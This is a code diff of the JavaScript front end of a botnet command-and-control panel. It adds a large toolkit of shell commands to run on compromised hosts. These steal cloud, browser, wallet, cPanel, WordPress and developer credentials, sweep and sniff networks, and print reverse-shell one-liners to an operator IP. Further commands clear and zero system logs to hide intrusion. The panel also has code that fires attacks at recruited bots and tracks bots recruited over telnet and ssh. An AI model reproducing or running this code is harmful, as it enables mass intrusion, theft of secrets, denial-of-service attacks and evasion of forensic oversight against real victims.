+  { name: 'Password Managers', cmd: 'find / \\( -name "*.kdbx" -o -name "*.kdb" -o -name "pass.gpg" -o -name ".password-store" \\) 2>/dev/null | head -10; find /home /root -name "*.kdbx" 2>/dev/null' },
+  { name: 'Git Config / Tokens', cmd: 'find / -name ".gitconfig" -readable 2>/dev/null | xargs cat 2>/dev/null; find / -name ".git-credentials" -readable 2>/dev/null | xargs cat 2>/dev/null; find / -path "*/.config/gh/hosts.yml" -readable 2>/dev/null | xargs cat 2>/dev/null' },
+  { name: 'Docker Registry Creds', cmd: 'cat ~/.docker/config.json 2>/dev/null; find / -name "config.json" -path "*/.docker/*" 2>/dev/null | xargs cat 2>/dev/null' },
+  { name: 'NPM / PyPI Tokens', cmd: 'cat ~/.npmrc 2>/dev/null; cat ~/.pypirc 2>/dev/null; cat ~/.pip/pip.conf 2>/dev/null; find /home /root -name ".npmrc" -o -name ".pypirc" 2>/dev/null | xargs cat 2>/dev/null' },
+  { name: 'Slack / Discord Tokens', cmd: 'find / -name "*.json" -readable 2>/dev/null | xargs grep -liE "xoxb-|xoxp-|xapp-|discord.*token" 2>/dev/null | head -10 | xargs grep -oE "xox[bpas]-[0-9A-Za-z-]+" 2>/dev/null | head -20' },
+  { name: 'Cloud Credentials (all)', cmd: 'echo "=== AWS ===" && cat ~/.aws/credentials 2>/dev/null; cat ~/.aws/config 2>/dev/null; echo "=== GCP ===" && cat ~/.config/gcloud/application_default_credentials.json 2>/dev/null | head -20; echo "=== Azure ===" && cat ~/.azure/accessTokens.json 2>/dev/null | head -20; cat ~/.azure/azureProfile.json 2>/dev/null | head -20; echo "=== DO ===" && cat ~/.config/doctl/config.yaml 2>/dev/null | grep token; echo "=== Terraform ===" && find / -name "*.tfstate" -readable 2>/dev/null | head -5 | xargs grep -l "password\\|secret\\|token" 2>/dev/null' },
+  { name: 'Browser Sessions (all)', cmd: 'find /home /root \\( -name "cookies.sqlite" -o -name "Cookies" -o -name "Login Data" -o -name "logins.json" -o -name "key4.db" -o -name "signons.sqlite" \\) 2>/dev/null; find /home /root -path "*Local Storage*" -name "*.ldb" 2>/dev/null | head -10' },
+  { name: 'Clipboard', cmd: 'xclip -selection clipboard -o 2>/dev/null || xsel --clipboard --output 2>/dev/null || wl-paste 2>/dev/null || echo "(no clipboard tool)"' },
+  { name: 'Mail Spools', cmd: 'ls /var/mail/ 2>/dev/null && cat /var/mail/$USER 2>/dev/null | head -40' },
+  { name: 'Wallet / Crypto', cmd: 'find / -name "*.wallet" -o -name "wallet.dat" -o -name "*.keystore" 2>/dev/null | head -10; find / -path "*/.bitcoin/wallet.dat" -o -path "*/.ethereum/keystore" 2>/dev/null | head -10' },
+  { name: 'DB Credentials', cmd: 'find / \\( -name "wp-config.php" -o -name "settings.py" -o -name "database.yml" -o -name ".env" \\) -readable 2>/dev/null | xargs grep -liE "password|passwd|db_pass" 2>/dev/null | head -10' },
+  { cat: 'Mining Recon' },
+  { name: 'Active Miners', cmd: 'ps aux 2>/dev/null | grep -iE "xmrig|minerd|cgminer|bfgminer|ethminer|nbminer|lolminer|t-rex|gminer|phoenix|teamred|nicehash|cpuminer|cryptonight|monero" | grep -v grep; ls /tmp/.* /var/tmp/.* 2>/dev/null | grep -iE "xmr|mine|crypt" | head -10' },
+  { name: 'Cron Miners', cmd: 'crontab -l 2>/dev/null | grep -iE "wget|curl|bash|sh -c|xmr|mine"; for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u $u 2>/dev/null | grep -iE "wget|curl|base64|xmr|mine" && echo "(user: $u)"; done; grep -r "wget\\|curl" /etc/cron* /var/spool/cron 2>/dev/null | grep -iE "base64|xmr|mine|\.sh" | head -10' },
+  { name: 'Miner Processes (deep)', cmd: 'ps auxww 2>/dev/null | grep -E "stratum|pool\\." | grep -v grep | head -20; ss -tp 2>/dev/null | grep -E "330[0-9]|444[0-9]|14444|45560|3333|5555|7777" | head -15; netstat -tnp 2>/dev/null | grep -E "330[0-9]|444[0-9]|14444" | head -10' },
+  { name: 'Pool Connections', cmd: 'ss -tn state established 2>/dev/null | awk \'{print $5}\' | cut -d: -f1 | sort | uniq -c | sort -rn | head -20; cat /proc/net/tcp 2>/dev/null | awk \'NR>1{printf "%d.%d.%d.%d:%d\\n", strtonum("0x"substr($3,7,2)),strtonum("0x"substr($3,5,2)),strtonum("0x"substr($3,3,2)),strtonum("0x"substr($3,1,2)),strtonum("0x"substr($3,10))}\' | head -20' },
+  { name: 'GPU / CPU Info', cmd: 'echo "=== CPU ===" && cat /proc/cpuinfo | grep -E "model name|cpu MHz|cores" | sort -u; echo "=== GPU ===" && nvidia-smi 2>/dev/null || lspci 2>/dev/null | grep -iE "vga|3d|nvidia|amd|radeon|intel" | head -10; echo "=== OpenCL ===" && ls /dev/nvidia* /dev/dri/* 2>/dev/null' },
+  { name: 'Installed Mining Tools', cmd: 'which xmrig xmr-stak cpuminer bfgminer cgminer ethminer nbminer lolminer t-rex gminer 2>/dev/null; find / -name "xmrig" -o -name "xmr-stak" -o -name "cpuminer" 2>/dev/null | head -10; find /tmp /var/tmp /dev/shm -executable -type f 2>/dev/null | head -10' },
+  { name: 'Mining Config Files', cmd: 'find / -name "config.json" -readable 2>/dev/null | xargs grep -l "pool\\|stratum\\|wallet\\|xmr" 2>/dev/null | head -10 | xargs cat 2>/dev/null | grep -iE "pool|url|user|wallet|algo" | head -30' },
+  { name: 'Systemd Miners', cmd: 'systemctl list-units --type=service 2>/dev/null | grep -iE "xmr|mine|crypt|monero"; find /etc/systemd /lib/systemd /usr/lib/systemd -name "*.service" 2>/dev/null | xargs grep -liE "xmrig|xmr|miner|cryptonight" 2>/dev/null | head -5 | xargs cat 2>/dev/null' },
+  { name: 'Resource Usage Spike', cmd: 'echo "=== Top CPU ===" && ps aux --sort=-%cpu 2>/dev/null | head -10 || ps aux | head -10; echo "=== Load Average ===" && uptime; echo "=== Memory ===" && free -h; echo "=== High CPU Procs ===" && ps aux 2>/dev/null | awk \'$3>20{print}\'' },
+  { name: 'Ld.so / Library Hijack', cmd: 'cat /etc/ld.so.preload 2>/dev/null && echo "PRELOAD SET" || echo "(no preload)"; echo "=== LD_PRELOAD ENV ===" && env | grep LD_; cat /etc/ld.so.conf 2>/dev/null; ls -la /etc/ld.so.conf.d/ 2>/dev/null' },
+  { cat: 'CMS / Web Panels' },
+  { name: 'WordPress Config', cmd: 'find / -name "wp-config.php" -readable 2>/dev/null | while read f; do echo "=== $f ==="; grep -E "DB_|table_prefix|secret_key|AUTH_KEY" "$f" 2>/dev/null; done | head -60' },
+  { name: 'WordPress Users', cmd: 'find / -name "wp-config.php" -readable 2>/dev/null | head -3 | while read f; do dir=$(dirname "$f"); php -r "define(\'ABSPATH\',\'$dir/\'); require(\'$dir/wp-load.php\'); global \$wpdb; print_r(\$wpdb->get_results(\'SELECT user_login,user_pass,user_email FROM wp_users LIMIT 20\'));" 2>/dev/null || grep -r "user_login\\|user_pass" "$dir/wp-content" 2>/dev/null | head -5; done' },
+  { name: 'WordPress Plugins', cmd: 'find / -name "wp-config.php" 2>/dev/null | head -3 | while read f; do dir=$(dirname "$f"); echo "=== $dir/wp-content/plugins ==="; ls "$dir/wp-content/plugins/" 2>/dev/null; done' },
+  { name: 'Joomla Config', cmd: 'find / -name "configuration.php" -readable 2>/dev/null | while read f; do echo "=== $f ==="; grep -E "\\$db|\\$password|\\$user|\\$secret|\\$host" "$f" 2>/dev/null; done | head -60' },
+  { name: 'Drupal Config', cmd: 'find / \\( -name "settings.php" -o -name "settings.local.php" \\) -readable 2>/dev/null | while read f; do echo "=== $f ==="; grep -E "database|username|password|host|driver" "$f" 2>/dev/null; done | head -60' },
+  { name: 'Laravel/Symfony .env', cmd: 'find / -name ".env" -readable 2>/dev/null | while read f; do echo "=== $f ==="; grep -iE "DB_|MAIL_|AWS_|APP_KEY|SECRET|TOKEN|PASSWORD" "$f" 2>/dev/null; done | head -80' },
+  { name: 'cPanel Users', cmd: 'ls /var/cpanel/users/ 2>/dev/null | head -30; cat /etc/trueuserdomains 2>/dev/null | head -20; ls /home/ 2>/dev/null' },
+  { name: 'cPanel Passwords', cmd: 'cat /var/cpanel/users/*/shadow 2>/dev/null | head -30; find /var/cpanel -name "*.pass" -o -name "*.shadow" 2>/dev/null | xargs cat 2>/dev/null | head -30' },
+  { name: 'cPanel MySQL DBs', cmd: 'mysql -u root -e "SHOW DATABASES; SELECT user,password,host FROM mysql.user;" 2>/dev/null; cat /root/.my.cnf 2>/dev/null; find /etc -name "*.cnf" -readable 2>/dev/null | xargs grep -iE "pass|user" 2>/dev/null | head -20' },
+  { name: 'cPanel Mail / Email', cmd: 'ls /home/*/mail/ 2>/dev/null | head -20; find /var/cpanel -name "*.shadow" 2>/dev/null | head -5 | xargs cat 2>/dev/null; cat /etc/valiases/* 2>/dev/null | head -20' },
+  { name: 'WHM/cPanel Config', cmd: 'cat /usr/local/cpanel/cpanel.config 2>/dev/null | grep -iE "pass|key|token|mysql" | head -20; cat /var/cpanel/cpanel.config 2>/dev/null | head -30' },
+  { name: 'Web Server Configs', cmd: 'find /etc/nginx /etc/apache2 /etc/httpd /usr/local/apache /usr/local/nginx -name "*.conf" -readable 2>/dev/null | xargs grep -liE "password|secret|auth_basic|ssl_certificate_key" 2>/dev/null | head -10 | xargs cat 2>/dev/null | grep -iE "pass|secret|key" | head -30' },
+  { name: 'PHP Session Files', cmd: 'ls -lt /tmp/sess_* /var/lib/php/sessions/sess_* 2>/dev/null | head -10; cat /tmp/sess_* 2>/dev/null | head -20 | strings | grep -iE "user|pass|email|token" | head -20' },
+  { name: 'Database Dumps', cmd: 'find / -name "*.sql" -o -name "*.sql.gz" -o -name "*.dump" 2>/dev/null | head -20; find /var/www /home /srv -name "backup*" -type f 2>/dev/null | head -10' },
+  { name: 'FTP Credentials', cmd: 'cat /etc/proftpd.conf /etc/proftpd/proftpd.conf 2>/dev/null | grep -iE "pass|user|auth" | head -10; cat /etc/vsftpd.conf 2>/dev/null | grep -v "^#" | head -20; find /home -name ".ftppass" -o -name "*.netrc" 2>/dev/null | xargs cat 2>/dev/null' },
+  { cat: 'IoT / Embedded' },
+  { name: 'Firmware Info', cmd: 'cat /etc/openwrt_release 2>/dev/null || cat /etc/firmware_version 2>/dev/null; strings /dev/mtdblock0 2>/dev/null | head -20' },
+  { name: 'BusyBox Check', cmd: 'busybox 2>&1 | head -3; ls /bin/busybox /usr/bin/busybox 2>/dev/null' },
+  { name: 'GPIO / Serial', cmd: 'ls /dev/tty* /dev/gpio* 2>/dev/null | head -20' },
+  { name: 'Dropbear Keys', cmd: 'cat /etc/dropbear/dropbear_rsa_host_key 2>/dev/null | base64 2>/dev/null; ls /etc/dropbear/ 2>/dev/null' },
+  { name: 'Router Config', cmd: 'nvram show 2>/dev/null | grep -iE "pass|key|ssid|wan" | head -20; cat /etc/config/wireless 2>/dev/null | head -30' },
+  { name: 'NVRAM Dump', cmd: 'nvram show 2>/dev/null | head -80 || cat /dev/mtd1 2>/dev/null | strings | grep -iE "user|pass|ssid|psk|key|wan|dns|route" | head -40' },
+  { name: 'MTD Partitions', cmd: 'cat /proc/mtd 2>/dev/null; ls -la /dev/mtd* 2>/dev/null | head -20; echo "=== FLASH ===" && dmesg 2>/dev/null | grep -i "mtd\\|flash\\|spi" | head -10' },
+  { name: 'UPnP / SSDP', cmd: 'echo -e "M-SEARCH * HTTP/1.1\\r\\nHOST: 239.255.255.250:1900\\r\\nMAN: ssdp:discover\\r\\nMX: 2\\r\\nST: ssdp:all\\r\\n\\r\\n" | timeout 3 socat - UDP4-DATAGRAM:239.255.255.250:1900 2>/dev/null | head -40 || echo "(socat not available)"' },
+  { cat: 'Network Attacks' },
+  { name: 'Ping Sweep', cmd: 'SUBNET=$(ip route 2>/dev/null | grep -v default | grep src | head -1 | awk "{print \\$1}"); echo "Sweeping $SUBNET"; for i in $(seq 1 254); do IP="${SUBNET%.*}.$i"; (ping -c1 -W1 $IP &>/dev/null && echo "ALIVE: $IP") & done; wait; echo "done"' },
+  { name: 'Port Scan (common)', cmd: 'TARGET=${1:-127.0.0.1}; echo "Scanning $TARGET"; for p in 21 22 23 25 53 80 110 111 135 139 143 443 445 993 995 1433 1521 3306 3389 5432 5900 6379 8080 8443 9200 27017; do (echo >/dev/tcp/$TARGET/$p 2>/dev/null && echo "OPEN: $p") & done; wait' },
+  { name: 'Established Connections', cmd: 'ss -tnp state established 2>/dev/null | head -40 || netstat -tnp 2>/dev/null | grep ESTABLISHED | head -40' },
+  { name: 'Traffic Sniff (10s)', cmd: 'timeout 10 tcpdump -i any -c 100 -nn "not port 22" 2>/dev/null | head -80 || echo "(tcpdump not available or no permissions)"' },
+  { name: 'Firewall Rules', cmd: 'echo "=== IPTABLES ===" && iptables -L -n -v 2>/dev/null | head -40 || echo "(no iptables)"; echo "=== NFTABLES ===" && nft list ruleset 2>/dev/null | head -30 || echo "(no nft)"; echo "=== UFW ===" && ufw status verbose 2>/dev/null || echo "(no ufw)"' },
+  { name: 'WiFi Networks', cmd: 'iwlist scan 2>/dev/null | grep -E "ESSID|Signal|Channel" | head -30 || iw dev 2>/dev/null && iw dev wlan0 scan 2>/dev/null | grep -E "SSID|signal|freq" | head -30 || cat /etc/wpa_supplicant/*.conf 2>/dev/null | grep -E "ssid|psk"' },
+  { name: 'VPN / Tunnel Config', cmd: 'ls /etc/openvpn/ /etc/wireguard/ 2>/dev/null; cat /etc/openvpn/*.conf 2>/dev/null | grep -vE "^#|^$" | head -20; cat /etc/wireguard/*.conf 2>/dev/null | head -20; ip tunnel show 2>/dev/null; wg show 2>/dev/null' },
+  { cat: 'Anti-Forensics' },
+  { name: 'Timestomp File', cmd: 'echo "Usage: touch -r /etc/passwd <target_file>"; ls -la /etc/passwd /bin/ls /usr/bin/env | head -5' },
+  { name: 'Process Hiding', cmd: 'echo "=== HIDDEN PROCS ===" && diff <(find /proc -maxdepth 1 -regex "/proc/[0-9]+" -print 2>/dev/null | wc -l) <(ps aux 2>/dev/null | wc -l) 2>/dev/null; echo "=== DELETED BINARIES ===" && find /proc/*/exe -type l 2>/dev/null | xargs ls -la 2>/dev/null | grep deleted | head -10' },
+  { name: 'Rootkit Check', cmd: 'echo "=== LD PRELOAD ===" && cat /etc/ld.so.preload 2>/dev/null && echo "PRELOAD ACTIVE" || echo "(clean)"; echo "=== LKM ===" && lsmod 2>/dev/null | head -20; echo "=== HIDDEN FILES ===" && find / -name ".*" -type f 2>/dev/null | grep -vE "^\\./(\\.|sys|proc)" | grep -iE "xmr|mine|hack|shell|back|root" | head -10' },
+  { name: 'Kernel Modules', cmd: 'lsmod 2>/dev/null | head -30; echo "=== RECENTLY LOADED ===" && dmesg 2>/dev/null | grep -iE "module|insmod|loaded" | tail -10; echo "=== MODPROBE ===" && cat /etc/modprobe.d/*.conf 2>/dev/null | grep -v "^#" | head -10' },
+  { cat: 'Util' },
+  { name: 'Arch + Libc', cmd: 'uname -m && file /bin/ls 2>/dev/null && ldd --version 2>&1 | head -1; cat /proc/version' },
+  { name: 'Available Tools', cmd: 'for t in wget curl python3 python perl ruby php gcc cc nmap socat nc ncat netcat openssl ssh scp rsync busybox docker kubectl gdb strace ltrace tcpdump; do which $t 2>/dev/null && echo "  ✓ $t"; done' },
+  { name: 'Writable PATH Dirs', cmd: 'echo $PATH | tr ":" "\\n" | while read d; do [ -w "$d" ] && echo "WRITABLE: $d"; done; echo "=== PATH ===" && echo $PATH' },
+  { name: 'File Download (curl)', cmd: 'echo "curl -sfLO http://YOUR_SERVER/file"; echo "wget -q http://YOUR_SERVER/file"; echo "busybox wget http://YOUR_SERVER/file -O /tmp/file"' },
+  { name: 'Reverse Shell Cmds', cmd: 'IP="YOUR_IP"; PORT="YOUR_PORT"; echo "=== BASH ===" && echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1"; echo "=== PYTHON ===" && echo "python3 -c \\"import os,pty,socket;s=socket.socket();s.connect((\\x27$IP\\x27,$PORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\\x27/bin/sh\\x27)\\""; echo "=== NC ===" && echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"' },
+  { name: 'Disk / Inode Usage', cmd: 'df -h 2>/dev/null; echo "=== INODES ===" && df -i 2>/dev/null | grep -v "Filesystem" | awk \'$5+0 > 50{print}\'; echo "=== BIG FILES ===" && find / -type f -size +100M 2>/dev/null | head -15' },
+  { name: 'Last Logins', cmd: 'last -20 2>/dev/null || lastlog 2>/dev/null | grep -v "Never" | head -20; echo "=== FAILED ===" && lastb 2>/dev/null | head -10 || grep -i "failed" /var/log/auth.log 2>/dev/null | tail -10' },
+  { name: 'Scheduled Tasks (all)', cmd: 'echo "=== ROOT CRON ===" && crontab -l 2>/dev/null; echo "=== SYSTEM CRON ===" && cat /etc/crontab 2>/dev/null; ls /etc/cron.d/ 2>/dev/null && cat /etc/cron.d/* 2>/dev/null; echo "=== USER CRONS ===" && for u in $(cut -d: -f1 /etc/passwd); do c=$(crontab -l -u "$u" 2>/dev/null); [ -n "$c" ] && echo "-- $u --" && echo "$c"; done; echo "=== TIMERS ===" && systemctl list-timers --all 2>/dev/null | head -15' },
+  { name: 'SELinux / AppArmor', cmd: 'echo "=== SELINUX ===" && getenforce 2>/dev/null || sestatus 2>/dev/null || echo "(no selinux)"; echo "=== APPARMOR ===" && aa-status 2>/dev/null || cat /sys/module/apparmor/parameters/enabled 2>/dev/null || echo "(no apparmor)"; echo "=== SECCOMP ===" && grep Seccomp /proc/self/status 2>/dev/null' },
   { cat: 'Cleanup' },
   { name: 'Clear Logs', cmd: 'echo > /var/log/auth.log 2>/dev/null; echo > /var/log/syslog 2>/dev/null; echo > /var/log/wtmp 2>/dev/null; echo > ~/.bash_history; history -c; echo "logs cleared"' },
   { name: 'Kill Traces', cmd: 'unset HISTFILE && export HISTSIZE=0 && echo "history disabled for session"' },
+  { name: 'Wipe Temp', cmd: 'rm -rf /tmp/.* /tmp/* 2>/dev/null; rm -rf /var/tmp/.* 2>/dev/null; echo "tmp wiped"' },
+  { name: 'Zero Wtmp/Utmp', cmd: '> /var/log/wtmp 2>/dev/null; > /var/log/utmp 2>/dev/null; > /var/log/lastlog 2>/dev/null; echo "login logs zeroed"' },
 ];
 
 function buildToolkitMenu() {
-  var menu = document.getElementById('shell-toolkit-menu');
-  if (!menu) return;
-  var html = '';
+  var body = document.getElementById('toolkit-grid-body');
+  if (!body) return;
+  var q = ((document.getElementById('toolkit-search') || {}).value || '').toLowerCase();
+
+  // Group items by category
+  var sections = [], cur = null;
   for (var i = 0; i < toolkitItems.length; i++) {
     var t = toolkitItems[i];
-    if (t.cat) {
-      html += '<div class="toolkit-cat">' + escHtml(t.cat) + '</div>';
-    } else {
-      var preview = t.cmd.length > 60 ? t.cmd.substring(0, 60) + '...' : t.cmd;
-      html += '<div class="toolkit-item" onclick="runToolkitItem(' + i + ')" title="' + escHtml(t.cmd) + '">' +
-        '<span class="toolkit-item-name">' + escHtml(t.name) + '</span>' +
-        '<span class="toolkit-item-preview">' + escHtml(preview) + '</span></div>';
-    }
+    if (t.cat) { cur = { cat: t.cat, items: [] }; sections.push(cur); }
+    else if (cur) cur.items.push({ idx: i, name: t.name, cmd: t.cmd });
   }
-  menu.innerHTML = html;
+
+  var html = '';
+  sections.forEach(function (sec) {
+    var items = q
+      ? sec.items.filter(function (it) { return it.name.toLowerCase().indexOf(q) !== -1 || it.cmd.toLowerCase().indexOf(q) !== -1; })
+      : sec.items;
+    if (!items.length) return;
+    html += '<div class="toolkit-section">';
+    html += '<div class="toolkit-section-header">' + escHtml(sec.cat) + '</div>';
+    html += '<div class="toolkit-section-grid">';
+    items.forEach(function (it) {
+      var prev = it.cmd.length > 55 ? it.cmd.slice(0, 55) + '…' : it.cmd;
+      html += '<div class="toolkit-item" onclick="runToolkitItem(' + it.idx + ')" title="' + escHtml(it.cmd) + '">' +
+        '<div class="toolkit-item-name">' + escHtml(it.name) + '</div>' +
+        '<div class="toolkit-item-preview">' + escHtml(prev) + '</div></div>';
+    });
+    html += '</div></div>';
+  });
+  body.innerHTML = html || '<div style="padding:16px;text-align:center;color:var(--text-dim);font-size:12px">No matches</div>';
 }
 
 function toggleToolkit() {
@@ -2875,7 +3619,12 @@ function runToolkitItem(idx) {
   if (!t || !t.cmd) return;
   document.getElementById('shell-toolkit-menu').classList.remove('open');
   document.removeEventListener('click', closeToolkitOutside);
-  shellSendCmd(t.cmd);
+  if (ptyMode && ptyTerm && shellWS && shellWS.readyState === 1) {
+    // In PTY mode: type the command + Enter into the terminal
+    shellWS.send(JSON.stringify({ type: 'pty_input', data: t.cmd + '\r' }));
+  } else {
+    shellSendCmd(t.cmd);
+  }
 }
 
 function shellNetScan() {
@@ -3002,6 +3751,14 @@ document.getElementById('shell-input').addEventListener('keydown', function (e) 
     document.getElementById('shell-output').innerHTML = '';
     return;
   }
+  if (e.key === 'c' && (e.ctrlKey || e.metaKey)) {
+    e.preventDefault();
+    shellCtrlC();
+    return;
+  }
+  if ((e.key === '=' || e.key === '+') && (e.ctrlKey || e.metaKey)) { e.preventDefault(); shellZoom(1); return; }
+  if (e.key === '-' && (e.ctrlKey || e.metaKey)) { e.preventDefault(); shellZoom(-1); return; }
+  if (e.key === 'F11') { e.preventDefault(); toggleShellMaximize(); return; }
 
   if (e.key === 'Tab') {
     e.preventDefault();
@@ -3019,17 +3776,21 @@ document.getElementById('shell-input').addEventListener('keydown', function (e) 
     if (!cmd || !shellWS) return;
     var p = document.getElementById('shell-prompt').textContent;
     appendOutput(p + ' ' + cmd + '\n');
-    shellWS.send(JSON.stringify({ command: cmd }));
+    // Use streaming for regular commands (not ! commands, not cd)
+    var useStream = !cmd.match(/^!/) && !cmd.match(/^cd(\s|$)/);
+    shellWS.send(JSON.stringify({ command: cmd, stream: useStream }));
 
-    // Track cd for prompt
+    // Client-side cwd tracking for prompt (server confirms via pwd output)
     if (cmd.match(/^cd(\s|$)/)) {
-      var d = cmd.replace(/^cd\s*/, '').trim();
-      if (!d || d === '~') { shellCwd = '~'; }
-      else if (d.match(/^\//)) { shellCwd = d; }
-      else if (d === '..') {
-        if (shellCwd === '~' || shellCwd === '/') { }
-        else { var parts = shellCwd.split('/'); parts.pop(); shellCwd = parts.join('/') || '/'; }
-      } else { shellCwd = (shellCwd === '~' ? '~' : shellCwd) + '/' + d; }
+      var dir = cmd.replace(/^cd\s*/, '').trim();
+      if (!dir || dir === '~') { shellCwd = '~'; }
+      else if (dir.match(/^\//)) { shellCwd = dir; }
+      else if (dir === '..') {
+        if (shellCwd !== '~' && shellCwd !== '/') {
+          var parts = shellCwd.split('/'); parts.pop();
+          shellCwd = parts.join('/') || '/';
+        }
+      } else { shellCwd = (shellCwd === '~' ? '~' : shellCwd) + '/' + dir; }
       document.getElementById('shell-prompt').textContent = shellCwd + '$ ';
       updateBreadcrumb();
       pendingCdRefresh = true;
@@ -3037,6 +3798,8 @@ document.getElementById('shell-input').addEventListener('keydown', function (e) 
 
     shellHistory.push(cmd);
     shellHistIdx = shellHistory.length;
+    shellCmdLog.push({ ts: Date.now(), cmd: cmd });
+    renderHistoryPanel();
     this.value = '';
   } else if (e.key === 'ArrowUp') {
     if (tcMatches.length) { e.preventDefault(); navigateTabComplete(-1); return; }
@@ -3178,18 +3941,18 @@ function refreshCurrentTab() {
   showToast('Refreshing...', true);
   switch (tab) {
     case 'tab-bots':
-      fetch('/api/bots').then(function(r){return r.json()}).then(function(bots){ updateBots(bots); });
-      fetch('/api/stats').then(function(r){return r.json()}).then(function(d){ updateStats(d); });
+      fetch('/api/bots').then(function (r) { return r.json() }).then(function (bots) { updateBots(bots); });
+      fetch('/api/stats').then(function (r) { return r.json() }).then(function (d) { updateStats(d); });
       break;
     case 'tab-socks':
-      fetch('/api/bots').then(function(r){return r.json()}).then(function(bots){ updateBots(bots); });
+      fetch('/api/bots').then(function (r) { return r.json() }).then(function (bots) { updateBots(bots); });
       break;
     case 'tab-attack':
       loadAttackHistory();
-      fetch('/api/stats').then(function(r){return r.json()}).then(function(d){ updateStats(d); });
+      fetch('/api/stats').then(function (r) { return r.json() }).then(function (d) { updateStats(d); });
       break;
     case 'tab-activity':
-      fetch('/api/activity').then(function(r){return r.json()}).then(function(e){ renderActivityFull(e); });
+      fetch('/api/activity').then(function (r) { return r.json() }).then(function (e) { renderActivityFull(e); });
       break;
     case 'tab-relays':
       loadRelays(); loadRelayAPIStatus(); loadWebhooks();
@@ -3490,8 +4253,10 @@ function fireAttack() {
     onConfirm: function () {
       if (botID) {
         // Single bot target
-        fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ command: cmd, botID: botID }) })
+        fetch('/api/command', {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ command: cmd, botID: botID })
+        })
           .then(function (r) { return r.json(); }).then(function (d) { showToast(d.message, d.success); })
           .catch(function () { showToast('Attack request failed', false); });
       } else if (atkGroup && window._bots) {
@@ -3502,15 +4267,19 @@ function fireAttack() {
           if (b.group !== atkGroup && b.origin !== atkGroup) return;
           if (archFilter && b.arch !== archFilter) return;
           if (minRAM > 0 && b.ram < minRAM) return;
-          fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ command: cmd, botID: id }) });
+          fetch('/api/command', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ command: cmd, botID: id })
+          });
           sent++;
         });
         showToast('Sent to ' + sent + ' bots in ' + atkGroup, sent > 0);
       } else {
         // Broadcast (with optional arch/RAM server-side filtering)
-        fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ command: cmd, botID: '', archFilter: archFilter, minRAM: minRAM }) })
+        fetch('/api/command', {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ command: cmd, botID: '', archFilter: archFilter, minRAM: minRAM })
+        })
           .then(function (r) { return r.json(); }).then(function (d) { showToast(d.message, d.success); })
           .catch(function () { showToast('Attack request failed', false); });
       }
@@ -3555,6 +4324,12 @@ function refreshArchDropdowns() {
     sel.value = prev;
   });
   updateScanFilterCount();
+}
+
+function getScanFilters() {
+  var archFilter = document.getElementById('scan-arch') ? document.getElementById('scan-arch').value : '';
+  var minRAM = document.getElementById('scan-ram') ? parseInt(document.getElementById('scan-ram').value) || 0 : 0;
+  return { archFilter: archFilter, minRAM: minRAM };
 }
 
 function updateScanFilterCount() {
@@ -3628,7 +4403,7 @@ function renderRunningAttacks(attacks) {
 
   // Update throughput gauge
   var totalBPS = 0, totalPPS = 0;
-  attacks.forEach(function(a) { totalBPS += (a.estBPS || 0); totalPPS += (a.estPPS || 0); });
+  attacks.forEach(function (a) { totalBPS += (a.estBPS || 0); totalPPS += (a.estPPS || 0); });
   var gauge = document.getElementById('throughput-gauge');
   var gaugeText = document.getElementById('throughput-text');
   if (gauge && gaugeText) {
@@ -3954,9 +4729,9 @@ var userLevel = 'Owner'; // default until /api/session responds
 function applyRBAC() {
   // Tab visibility rules: which roles can see each tab
   var tabRules = {
-    'tab-users':    ['Owner', 'Admin'],
-    'tab-relays':   ['Owner', 'Admin'],
-    'tab-tasks':    ['Owner', 'Admin']
+    'tab-users': ['Owner', 'Admin'],
+    'tab-relays': ['Owner', 'Admin'],
+    'tab-tasks': ['Owner', 'Admin']
   };
   // Hide/show tab buttons based on their data-tab attribute
   document.querySelectorAll('.tab-bar .tab[data-tab]').forEach(function (btn) {
@@ -4066,10 +4841,10 @@ function updateScannerStats() {
     counts[o] = (counts[o] || 0) + 1;
   });
   var html = '';
-  var order = ['direct','b0at.telnet','b0at.ssh'];
+  var order = ['direct', 'b0at.telnet', 'b0at.ssh'];
   order.forEach(function (key) {
     var n = counts[key] || 0;
-    var label = key === 'direct' ? 'Direct' : key.replace('b0at.','');
+    var label = key === 'direct' ? 'Direct' : key.replace('b0at.', '');
     var color = _originColors[key] || '#8b949e';
     html += '<div class="scanner-stat-card" style="border-color:' + color + '44">' +
       '<div class="scanner-stat-name" style="color:' + color + '">' + label + '</div>' +
@@ -4077,17 +4852,19 @@ function updateScannerStats() {
       '<div class="scanner-stat-label">bots recruited</div></div>';
   });
   // Also count any unknown origins
-  Object.keys(counts).forEach(function (k) { if (order.indexOf(k) < 0) {
-    html += '<div class="scanner-stat-card"><div class="scanner-stat-name">' + escHtml(k) + '</div>' +
-      '<div class="scanner-stat-count">' + counts[k] + '</div><div class="scanner-stat-label">bots</div></div>';
-  }});
+  Object.keys(counts).forEach(function (k) {
+    if (order.indexOf(k) < 0) {
+      html += '<div class="scanner-stat-card"><div class="scanner-stat-name">' + escHtml(k) + '</div>' +
+        '<div class="scanner-stat-count">' + counts[k] + '</div><div class="scanner-stat-label">bots</div></div>';
+    }
+  });
   grid.innerHTML = html;
 }
 
 // Hook into bot refresh cycle
 var _origUpdateBotCount = typeof updateBotCount === 'function' ? updateBotCount : null;
 if (_origUpdateBotCount) {
-  updateBotCount = function() {
+  updateBotCount = function () {
     _origUpdateBotCount();
     updateScannerStats();
   };
@@ -4123,29 +4900,20 @@ function openDrawer(botID) {
   var id = b.botID.replace(/'/g, "\\'");
   var acts = '';
   acts += '<button class="drawer-act" onclick="closeDrawer();openShell(\'' + id + '\')">Shell</button>';
-  acts += '<button class="drawer-act" onclick="popupCmd(\'' + id + '\',\'!info\')">Info</button>';
-  acts += '<button class="drawer-act" onclick="popupCmd(\'' + id + '\',\'!persist\')">Persist</button>';
-  acts += '<button class="drawer-act" onclick="popupCmd(\'' + id + '\',\'!socks\')">SOCKS</button>';
